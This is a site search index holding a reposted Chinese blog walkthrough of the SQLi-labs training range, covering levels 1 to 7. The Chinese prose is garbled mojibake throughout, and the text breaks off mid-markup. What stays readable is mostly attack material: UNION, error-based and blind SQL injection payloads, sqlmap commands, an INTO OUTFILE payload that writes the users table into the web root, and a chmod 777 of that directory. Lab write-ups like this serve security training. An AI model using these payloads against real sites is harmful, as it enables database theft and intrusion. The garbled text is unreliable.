<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQLI-labsé¶åœºå­¦ä¹ è®°å½•</title>
      <link href="/2022/01/20/sqli-labs-ba-chang-xue-xi-ji-lu/"/>
      <url>/2022/01/20/sqli-labs-ba-chang-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>å¤‡æ³¨ï¼šè½¬è½½è‡³å›½å…‰å¤§ä½¬çš„ç¬”è®°ï¼›</p><p>SQLi Labs æ˜¯ä¸€ä¸ªæ¯”è¾ƒå…¨é¢çš„æ‰‹å·¥æ³¨å…¥ç»ƒä¹ é¶åœºï¼Œå› ä¸ºå¾ˆå…¨é¢ï¼Œå¾ˆå°‘æœ‰äººå¯ä»¥åšæŒåšå®Œï¼Œå»ºè®®åšæŒæ‰“ä¸€éç§‰åšå¥½ç¬”è®°ï¼›</p><h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><p><strong>é¡¹ç›®åœ°å€</strong>ï¼š<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>Sqli-labs æ˜¯ä¸€ä¸ªå¼€æºä¸”å…¨é¢çš„ SQL æ³¨å…¥ç»ƒä¹ é¶åœºï¼Œæ‰‹å·¥æ³¨å…¥å¿…å¤‡çš„ç»ƒä¹ ç¯å¢ƒï¼›</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>å®‰è£…ä½¿ç”¨ Docker å°±æ¯”è¾ƒç®€å•çœäº‹å„¿ï¼Œç›´æ¥åœ¨ dockerhub æœç´¢ï¼Œæ‰¾ä¸‹è½½é‡æ¯”è¾ƒé«˜ï¼ˆ<a href="https://hub.docker.com/r/acgpiano/sqli-labs">acgpiano/sqli-labs</a>ï¼‰çš„æ¥å®‰è£…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull acgpiano/sqli-labs<span class="token function">docker</span> run -dt --name sqli-lab -p <span class="token number">8888</span>:80 acgpiano/sqli-labs:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è‡ªå·±å°†<code>8888</code>ä¿®æ”¹æˆè‡ªå·±éœ€è¦æ˜ å°„çš„ç«¯å£ï¼Œè¿™ä¸ªå®¹å™¨é»˜è®¤æ˜¯<strong>æ²¡åˆå§‹åŒ–</strong> SQLi-labs æ•°æ®åº“çš„ï¼Œæ‰€ä»¥å¾—è‡ªå·±åˆå§‹åŒ–ä¸€ä¸‹ã€‚</p><p>é€šè¿‡æŸ¥çœ‹å®¹å™¨é‡Œé¢çš„é…ç½®æ–‡ä»¶ï¼Œå‘ç° MySQL çš„ root ç”¨æˆ·çš„å¯†ç ä¸º <code>ç©º</code>ï¼Œç›¸å…³ç‰ˆæœ¬çš„ç»†èŠ‚å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ mysql -e <span class="token string">"select version(),user()"</span>+-------------------------+----------------+<span class="token operator">|</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token operator">|</span> user<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token operator">|</span>+-------------------------+----------------+<span class="token operator">|</span> <span class="token number">5.5</span>.44-0ubuntu0.14.04.1 <span class="token operator">|</span> root@localhost <span class="token operator">|</span>+-------------------------+----------------+$ php --versionPHP <span class="token number">5.5</span>.9-1ubuntu4.13 <span class="token punctuation">(</span>cli<span class="token punctuation">)</span> <span class="token punctuation">(</span>built: Sep <span class="token number">29</span> <span class="token number">2015</span> <span class="token number">15</span>:24:49<span class="token punctuation">)</span>Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">1997</span>-2014 The PHP GroupZend Engine v2.5.0, Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">1998</span>-2014 Zend Technologies    with Zend OPcache v7.0.3, Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">1999</span>-2014, by Zend Technologies$ <span class="token builtin class-name">cd</span> /etc/init.d/ <span class="token operator">&amp;&amp;</span> apache2 -vServer version: Apache/2.4.7 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>Server built:   Oct <span class="token number">14</span> <span class="token number">2015</span> <span class="token number">14</span>:20:21$ <span class="token function">uname</span> -aLinux 5fd18b4e45eb <span class="token number">4.19</span>.76-linuxkit <span class="token comment">#1 SMP Fri Apr 3 15:53:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ–°ç‰ˆçš„ Docker æ˜¯æ”¯æŒå›¾å½¢åŒ– Dashboard ç®¡ç†å®¹å™¨çš„ï¼›</p><p><img src="https://image.3001.net/images/20200513/15893551932887.png" alt="img"></p><h2 id="æ•ˆç‡å¿…å¤‡"><a href="#æ•ˆç‡å¿…å¤‡" class="headerlink" title="æ•ˆç‡å¿…å¤‡"></a>æ•ˆç‡å¿…å¤‡</h2><ul><li>æŠ“åŒ…å·¥å…· Burpsuiteï¼Œå› ä¸ºåé¢æœ‰ POST æ³¨å…¥ï¼ŒæŠ“åŒ…æ–¹ä¾¿åˆ†æ</li><li>è€ç‰ˆæœ¬çš„ Hackerbarï¼ŒåŠè‡ªåŠ¨åŒ–æ‰‹å·¥æ³¨å…¥å¿…å¤‡</li></ul><h1 id="åŸºç¡€æŒ‘æˆ˜-1-20-å…³"><a href="#åŸºç¡€æŒ‘æˆ˜-1-20-å…³" class="headerlink" title="åŸºç¡€æŒ‘æˆ˜ 1-20 å…³"></a>åŸºç¡€æŒ‘æˆ˜ 1-20 å…³</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>æºç ç®€å•åˆ†æ</strong>ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># å•å¼•å·æ‹¼æ¥</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment"># æ”¯æŒè”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    è¾“å‡ºæŸ¥è¯¢å†…å®¹<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥"></a>è”åˆæŸ¥è¯¢æ³¨å…¥</h3><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">payloadï¼š?id&#x3D;-1&#39;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="æŠ¥é”™æ³¨å…¥1"><a href="#æŠ¥é”™æ³¨å…¥1" class="headerlink" title="æŠ¥é”™æ³¨å…¥1"></a>æŠ¥é”™æ³¨å…¥1</h3><p>æ‰‹åŠ¨ä¿®æ”¹ <code>LIMIT+0,1</code> æ¥è¿›è¡Œç»“æœåç§»</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">payloadï¼š?id&#x3D;1&#39;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="æŠ¥é”™æ³¨å…¥2"><a href="#æŠ¥é”™æ³¨å…¥2" class="headerlink" title="æŠ¥é”™æ³¨å…¥2"></a>æŠ¥é”™æ³¨å…¥2</h3><p>æ‰‹åŠ¨ä¿®æ”¹ <code>LIMIT+0,1</code> æ¥è¿›è¡Œç»“æœåç§»</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">payloadï¼š?id&#x3D;1&#39;+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(username+AS+CHAR),0x27,0x7e)+FROM+users+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1&#x3D;1--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h3><p>æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—æ¯ä¸º <code>s</code></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">payloadï¼š?id&#x3D;1&#39; and left(database(),1)&gt;&#39;r&#39;--+?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="å»¶æ—¶ç›²æ³¨"><a href="#å»¶æ—¶ç›²æ³¨" class="headerlink" title="å»¶æ—¶ç›²æ³¨"></a>å»¶æ—¶ç›²æ³¨</h3><p>æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—æ¯çš„ ascii ç ä¸º 115ï¼Œå³<code>s</code></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><strong>è”åˆæŸ¥è¯¢æ³¨å…¥</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>U -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>æŠ¥é”™æ³¨å…¥</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>E -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>å¸ƒå°”ç›²æ³¨</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>å»¶æ—¶ç›²æ³¨</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>T -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=$id</code></td></tr></tbody></table><p>å’Œ Less-1 åˆ©ç”¨æ–¹å¼ä¸€è‡´ï¼Œåªæ˜¯é—­åˆæ–¹å¼ä¸ä¸€æ ·è€Œå·²ï¼Œè¿™é‡Œå³ä¸å†å•°å—¦äº†ã€‚</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>å’Œ Less-1 åˆ©ç”¨æ–¹å¼ä¸€è‡´ï¼Œåªæ˜¯é—­åˆæ–¹å¼ä¸ä¸€æ ·è€Œå·²ï¼Œè¿™é‡Œå³ä¸å†å•°å—¦äº†ã€‚</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=(&quot;$id&quot;)</code></td></tr></tbody></table><p><strong>æºç ç®€å•åˆ†æ</strong>ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># å…ˆåŒå¼•å· åœ¨æ‹¬å·æ‹¼æ¥</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$id</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=(<span class="token interpolation"><span class="token variable">$id</span></span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment"># æ”¯æŒè”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    è¾“å‡ºæŸ¥è¯¢å†…å®¹<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>æºç ç®€å•åˆ†æ</strong>ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># ç›´æ¥å•å¼•å·æ‹¼æ¥</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment"># æ”¯æŒæŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    è¾“å‡º You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">.</span><span class="token operator">.</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºä¸è¾“å‡ºæŸ¥è¯¢çš„ç»“æœï¼Œè¿™å°±å¯¼è‡´ä¸å¯ä»¥ä½¿ç”¨è”åˆæŸ¥è¯¢çš„æ³¨å…¥æ–¹å¼ï¼Œä½†æ˜¯å¹¶ä¸å½±å“æ­£å¸¸ä½¿ç”¨æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨å’Œå»¶æ—¶ç›²æ³¨ï¼Œé™¤äº†ä¸èƒ½è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œå…¶ä»–å’Œ Less-1 åˆ©ç”¨æ–¹å¼ä¸€è‡´ï¼Œè¿™é‡Œå³ä¸å†å•°å—¦äº†ã€‚</p><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>å’Œ Less-5 åˆ©ç”¨æ–¹å¼ä¸€è‡´ï¼Œåªæ˜¯é—­åˆæ–¹å¼ä¸ä¸€æ ·ï¼Œè¿™é‡Œå³ä¸å†å•°å—¦äº†ã€‚</p><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=((&#39;$id&#39;))</code></td></tr></tbody></table><p><strong>æºç ç®€å•åˆ†æ</strong>ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># ä½¿ç”¨å•å¼•å·åŠ åŒå±‚æ‹¬å·æ‹¼æ¥</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=(('<span class="token interpolation"><span class="token variable">$id</span></span>')) LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment"># æ”¯æŒå¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    è¾“å‡º You are in<span class="token operator">...</span><span class="token operator">.</span> <span class="token keyword">Use</span> <span class="token package">outfile</span><span class="token operator">...</span><span class="token operator">...</span><span class="token keyword">else</span><span class="token punctuation">:</span>    è¾“å‡º You have an error in your <span class="token constant">SQL</span> syntax  <span class="token comment">//print_r(mysql_error());</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºè¿™é‡ŒæŠŠ<code>print_r(mysql_error());</code>ç»™æ³¨é‡Šæ‰äº†ï¼Œæ‰€ä»¥å°±ä¸å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥äº†ï¼Œè¿™ä¸ªæ—¶å€™åªèƒ½ä½¿ç”¨å¸ƒå°”ç›²æ³¨å’Œå»¶æ—¶ç›²æ³¨ï¼Œå¯ä»¥å°è¯•æ‰‹å·¥éªŒè¯ä¸€ä¸‹ç„¶åæ”¾åˆ° sqlmap é‡Œé¢æ¥è·‘ã€‚</p><h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><p>ç›²æ³¨è¿˜æ˜¯å¸¸è§„æ€è·¯ï¼Œè¿™é‡Œå®é™…ä¸Šå’Œå‰é¢çš„æ˜¯ä¸€æ ·çš„ï¼Œå°±å†å•°å—¦ä¸€ä¸‹ï¼Œä½¿ç”¨ sqlmap ç›´æ¥éªŒè¯çœ‹çœ‹ï¼š</p><p><strong>å¸ƒå°”ç›²æ³¨</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-7/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sqlmap çš„ Payload å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">id&#x3D;1&#39;) AND 3542&#x3D;3542 AND (&#39;rmsD&#39;&#x3D;&#39;rmsD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>å»¶æ—¶ç›²æ³¨</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-7/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>T -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sqlmap çš„ Payload å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">id&#x3D;1&#39;) AND (SELECT 9943 FROM (SELECT(SLEEP(5)))XOYy) AND (&#39;QUpy&#39;&#x3D;&#39;QUpy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å¯¼å‡ºæ•°æ®åˆ°æ–‡ä»¶"><a href="#å¯¼å‡ºæ•°æ®åˆ°æ–‡ä»¶" class="headerlink" title="å¯¼å‡ºæ•°æ®åˆ°æ–‡ä»¶"></a>å¯¼å‡ºæ•°æ®åˆ°æ–‡ä»¶</h3><p>å› ä¸ºè¿™ä¸€å…³ä½œè€…å¾ˆæ˜æ˜¾åœ°æç¤ºäº†å¦‚ä¸‹ä¿¡æ¯ï¼š</p><pre class="line-numbers language-none"><code class="language-none">You are in.... Use outfile......<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é»˜è®¤ outfile æ˜¯æ²¡æœ‰å¼€å¯çš„ï¼Œå¾—æ‰‹åŠ¨å¼€å¯ä¸€ä¸‹ï¼Œè¿™ä¸ª Docker é¶æœºç†è®ºä¸Šåº”è¯¥æ˜¯å¼€å¯çš„ï¼Œè¿›å…¥å®¹å™¨éªŒè¯ä¸€ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># mysql -e "show global variables like '%secure%';"</span>+------------------+-------+<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> Value <span class="token operator">|</span>+------------------+-------+<span class="token operator">|</span> secure_auth      <span class="token operator">|</span> OFF   <span class="token operator">|</span><span class="token operator">|</span> secure_file_priv <span class="token operator">|</span>       <span class="token operator">|</span>+------------------+-------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ure_file_priv çš„å€¼ä¸º <code>null</code> ï¼Œè¡¨ç¤ºé™åˆ¶ mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º</li><li>å½“secure_file_priv çš„å€¼ä¸º <code>/tmp/</code> ï¼Œè¡¨ç¤ºé™åˆ¶ mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹</li><li>å½“secure_file_priv çš„å€¼ä¸º <code>ç©º</code> æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹ mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶</li></ul><p>ä¸‹é¢å¼€å§‹ç›´æ¥å°†æ•°æ®åº“é‡Œé¢çš„ä¿¡æ¯å¯¼å‡ºåˆ°æ–‡ä»¶ä¸­å§ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#x2F;?id&#x3D;1&#39;))+UNION+SELECT * from security.users INTO OUTFILE &quot;users.txt&quot;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å› ä¸ºå¯¼å‡ºæ²¡æœ‰æŒ‡å®šè·¯å¾„ï¼Œæ‰€ä»¥ Linux ä¸‹ MySQL é»˜è®¤å¯¼å‡ºçš„è·¯å¾„ä¸ºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/var/lib/mysql/security<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹ä¸‹æ˜¯å¦å°†æ•°æ®åº“ä¿¡æ¯å¯¼å‡ºåˆ°æ–‡ä»¶ä¸­äº†ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /var/lib/mysql/security/users.txt<span class="token number">1</span>    Dumb    Dumb<span class="token number">2</span>    Angelina    I-kill-you<span class="token number">3</span>    Dummy    p@ssword<span class="token number">4</span>    secure    crappy<span class="token number">5</span>    stupid    stupidity<span class="token number">6</span>    superman    genious<span class="token number">7</span>    batman    mob<span class="token operator">!</span>le<span class="token number">8</span>    admin    admin<span class="token number">9</span>    admin1    admin1<span class="token number">10</span>    admin2    admin2<span class="token number">11</span>    admin3    admin3<span class="token number">12</span>    dhakkan    dumbo<span class="token number">14</span>    admin4    admin4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯è¿™æ ·å¹¶æ²¡æœ‰ä»€ä¹ˆå®é™…çš„ä½œç”¨ï¼Œå› ä¸ºè¿™ä¸ªè·¯å¾„æˆ‘ä»¬åŒè¿‡ Web æ˜¯æ— æ³•è®¿é—®çš„ï¼Œæ‰€ä»¥è¿™ä¸ªå¯¼å‡ºçš„ä¿¡æ¯å°½ç®¡æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯è®¿é—®ä¸åˆ°è¿™ä¸ªä¿¡æ¯å°±ç™½ç™½ä½œåºŸäº†ã€‚</p><p>æ‰€ä»¥ä¸€èˆ¬æˆ‘ä»¬å°†è¿™ä¸ªä¿¡æ¯å¯¼å‡ºåˆ°ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ï¼Œæ‰€ä»¥éœ€è¦çŸ¥é“ç½‘ç«™çš„ç‰©ç†è·¯å¾„ä¿¡æ¯ï¼Œå› ä¸ºè¿™é‡Œæ˜¯é¶æœºï¼Œæ‰€æœ‰è¿™é‡Œå°±ç›´æ¥å¯¼å‡ºåˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹çœ‹çœ‹ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#x2F;?id&#x3D;1&#39;))+UNION+SELECT * from security.users INTO OUTFILE &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;Less-7&#x2F;users.txt&quot;--+ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œå› ä¸ºè¿™ä¸ª Docker é¶åœºç¯å¢ƒæ²¡æœ‰é…ç½®å¥½æƒé™é—®é¢˜ï¼Œæˆ‘ä»¬é€šè¿‡ MySQL ç›´æ¥å¾€ Web ç›®å½•ä¸‹å†™æ–‡ä»¶ä¼šæ˜¯å¤±è´¥çš„ï¼Œæç¤ºå¦‚ä¸‹ä¿¡æ¯ï¼š</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog">syntaxCan't create<span class="token operator">/</span>write to file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªæ—¶å€™ä¸ºäº†æ¼”ç¤ºè¿™ä¸ªæ•ˆæœï¼Œè¿™é‡Œåªèƒ½è¿›å®¹å™¨æ¥æ‰‹åŠ¨æŠŠæƒé™ç»™å¼€ä¸€ä¸‹äº†ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">chmod</span> -R <span class="token number">777</span> /var/www/html<span aria-hidden="true" 